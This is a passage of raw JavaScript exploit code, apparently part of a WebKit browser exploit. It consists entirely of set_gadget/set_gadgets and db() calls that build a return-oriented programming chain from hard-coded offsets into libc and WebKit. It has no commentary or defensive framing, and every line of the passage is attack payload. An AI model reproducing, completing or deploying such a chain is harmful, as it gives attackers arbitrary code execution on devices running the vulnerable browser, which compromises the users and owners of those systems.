ropchain+233464, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+233456, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+233480, 
ropchain+233496, 
libc_base+811575, 
ropchain+239016, 
libc_base+759626, 
libc_base+793877 
]);
db([4294966264, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+233592, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+233648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+233712, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294966264, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+233800, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+233816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+233968, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+234000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+233952, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+233984, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+234072, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+234088, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+234184, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+234168, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+234264, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([32, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+234416, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+234432, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+234400, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+234600, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+234616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+234584, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+234720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+234768, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+234752, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+234880, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+234872, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+234896, 
ropchain+234912, 
libc_base+811575, 
ropchain+234928, 
libc_base+811575, 
ropchain+238808, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([25, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+235176, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+235264, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+235280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+235416, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+235432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+235400, 
webkit_base+7438103, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+235520, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+235536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+235680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+235648, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+235664, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+235752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+235808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+235904, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294966264, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+235992, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+236008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+236160, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+236192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+236144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+236176, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+236352, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+236320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+236304, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+236424, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+236440, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+236528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+236584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+236704, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+236736, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+236720, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+236888, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+236920, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+236872, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+236904, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+236992, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+237008, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+237104, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+237088, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+237208, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+243896, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+237344, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+237360, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+237328, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+237464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+237512, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+237496, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+237624, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+237616, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+237640, 
ropchain+238088, 
libc_base+50775, 
libc_base+793877, 
ropchain+237712, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+237864, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+237896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+237848, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+237880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+237968, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+237984, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+238080, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+238064, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+238144, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294966264, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+238232, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+238248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+238400, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+238432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+238384, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+238416, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+238528, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+238512, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+238616, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+238688, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294966264, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+238752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+233656, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+397896, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+238968, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+245224, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+227408, 
libc_base+793877, 
ropchain+239072, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+239160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+239176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+239312, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+239328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+239296, 
webkit_base+7438103, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+239416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+239432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+239584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+239616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+239568, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+239600, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+239712, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+239696, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+239816, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+172888, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([65, 0]); 
set_gadget(libc_base+792472,); 
db([65, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+397920, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+240096, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+240168, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+240296, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+240280, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+240392, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+240480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+240496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+240600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+240584, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+240656, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+240760, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+240848, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+240864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+241000, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+241016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+240984, 
webkit_base+7438103, 
libc_base+793877 
]);
db([8, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+241104, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+241120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+241272, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+241304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+241256, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+241288, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+241376, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+241392, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+241504, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+241488, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
libc_base+793877, 
ropchain+241632, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+241648, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+241616, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+241752, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+241816, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+241784, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+241936, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+241928, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+241952, 
ropchain+243128, 
libc_base+793877, 
ropchain+242008, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+242096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+242112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+242248, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+242264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+242232, 
webkit_base+7438103, 
libc_base+793877 
]);
db([12, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+242352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+242368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+242520, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+242552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+242504, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+242536, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+242624, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+242640, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+242752, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+242736, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
libc_base+793877, 
ropchain+242880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+242896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+242864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+243032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+243048, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+243016, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+243120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+793877, 
ropchain+243240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+243256, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+243224, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+243360, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+243408, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+243392, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
